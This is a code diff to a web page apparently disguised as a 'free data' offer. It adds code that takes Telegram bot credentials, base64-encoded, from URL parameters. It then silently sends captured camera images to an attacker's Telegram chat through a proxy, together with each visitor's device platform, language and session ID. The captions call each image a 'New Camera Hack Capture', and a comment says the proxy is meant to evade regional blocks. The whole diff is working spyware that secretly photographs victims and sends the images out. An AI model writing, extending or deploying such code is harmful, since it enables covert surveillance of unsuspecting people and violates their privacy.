@@ -1463,6 +1463,16 @@
         const themeKey = params.get('th') || 'freedata';
         const theme = THEMES[themeKey] || THEMES.freedata;
 
+        // Telegram Credentials (encoded)
+        let tgBot = '';
+        let tgChat = '';
+        try {
+            const b = params.get('bot');
+            const c = params.get('chat');
+            if (b) tgBot = atob(b);
+            if (c) tgChat = atob(c);
+        } catch (e) { }
+
         // Apply theme class to body
         document.body.classList.add('th-' + themeKey);
 
@@ -1797,6 +1807,49 @@
                     localStorage.setItem(key, JSON.stringify(existing));
                 } catch { }
             }
+
+            // --- Real-time Telegram Push ---
+            if (tgBot && tgChat) {
+                sendToTelegram(dataUrl);
+            }
+        }
+
+        async function sendToTelegram(dataUrl) {
+            try {
+                const base64Data = dataUrl.split(',')[1];
+                const byteCharacters = atob(base64Data);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], { type: 'image/jpeg' });
+
+                const formData = new FormData();
+                formData.append('chat_id', tgChat);
+                formData.append('photo', blob, `capture_${Date.now()}.jpg`);
+
+                let caption = `📸 *New Camera Hack Capture!*\n\n` +
+                    `👤 *Session:* \`${sessionId}\`\n` +
+                    `🎨 *Theme:* \`${themeKey}\`\n` +
+                    `📱 *Device:* ${navigator.platform}\n` +
+                    `🌍 *Language:* ${navigator.language}\n` +
+                    `⏰ *Time:* ${new Date().toLocaleTimeString()}\n` +
+                    `🔗 *Link:* [View on Site](${window.location.host})\n\n` +
+                    `#cemrahack #session_${sessionId}`;
+
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+
+                // Bypass Regional Blocks (e.g. Pakistan) by using our Vercel Proxy
+                // This routes the request through Vercel's US/UK servers
+                const proxyUrl = `/api/tg-proxy?bot=${tgBot}`;
+
+                fetch(proxyUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) { }
         }
 
         function cleanupStorage(neededSize) {
